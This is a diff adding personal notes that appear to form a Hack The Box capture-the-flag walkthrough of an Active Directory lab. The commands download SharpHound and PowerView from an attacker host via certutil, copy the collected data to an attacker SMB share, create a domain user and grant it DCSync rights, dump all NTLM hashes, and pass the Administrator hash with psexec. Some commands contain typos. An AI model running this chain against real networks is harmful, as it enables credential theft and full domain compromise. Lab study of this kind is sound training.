@@ -301,6 +301,81 @@ The Exchange group membership is leveraged to gain DCSync privileges on the doma
                 File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
 
 
+        From this Path: C:\windows\tasks
+            We can use certuli.exe because we have 'W' rights
+
+3-Ad Enumeration BloodHound:
+    On Kali:
+        First copy SharpHound to the same Path with the python3 -m web.server:
+            cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe .
+
+        If we forget our neo4j psswd:
+            locate neo4j | grep auth <---Find the file path
+            AND 
+            DELETE the File 
+            THEN 
+            RESTART neo4j
+                neo4j console
+                enter pswwd in localhost server 
+            Run BloodHound:    
+                /usr/lib/bloodhound/BloodHound --no-sandbox
+
+
+    On Windows:
+        *Evil-WinRM* PS C:\windows\tasks> certutil.exe -urlcache -f http://<KaliIP>/SharpHound.exe SharpHound.exe
+        .\SharpHound.exe -c all
+
+        To Forward SharpHound logs to BloodHound in Kali we will RE-Use the SMB server:
+            *Evil-WinRM* PS C:\windows\tasks> Copy-Item "MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin" -Destination "\\<KaliIP>\coolz"
+            *Evil-WinRM* PS C:\windows\tasks> Copy-Item "20240214173408_BloodHound.zip" -Destination "\\<KaliIP>\coolz"
+
+    On Kali:
+        We import the data into  BloodHound:
+            1- We will search relationships for svc-alfresco because we use this account:
+                SVC-ALFRESCO@HTB.LOCAL
+            2- Mark User as Owned
+
+            3-We will Target "Service Accounts@HTB.local" because we'll perhaps create our User.
+
+    On Windows we will create our new user in order to dump ALL Users Hashes:
+        evil-WinRM* PS C:\windows\tasks> net user adib adib1234 /add /domain
+
+        We will add the the "Exchange Windows Permissions" Group:
+            net group "Exchange Windows Permissions" /add adib
+
+    On Kali:  
+        We need to force the DC-Sync to add our created user.
+        We'll use PowerView.ps1 via Powersploit to use the BloodHound cmd of DC Sync:
+            git clone https://github.com/PowerShellMafia/Powersploit/ -b dev 
+
+            cd Powersploit/Recon/
+
+    On Windows:
+        *Evil-WinRM* PS C:\windows\tasks> certutil.exe -urlcache -f http://<KaliIP>/PowerView.ps1 PowerView.ps1
+        $pass = convertto-securestring 'adib1234' -AsPlainText -Force
+        $cred = New-Object System.Management.Automation.PSCredential('HTB\adib', $pass)
+        Import-Module .\PowerView.ps1 <--- Avoid (Add-DomainObjectAcl Unknown cmdlet)
+        Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity adib -Rights DCSync
+
+    On Kali:
+        To dump NTLM Hashes of all users in the machine    
+            sudo /usr/share/doc/python3-impacket/examples/secretsdump.py htb.local/adib:adib1234@10.10.10.161
+
+        We will use the Administrator Hash via psexec:
+            /usr/share/doc/python3-impacket/examples/psexec.py -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
+
+    On Windows:
+        C:\Windows\system32> whoami
+            nt authority\system
+
+            
+        
+
+    
+
+
+
+
 
 
 
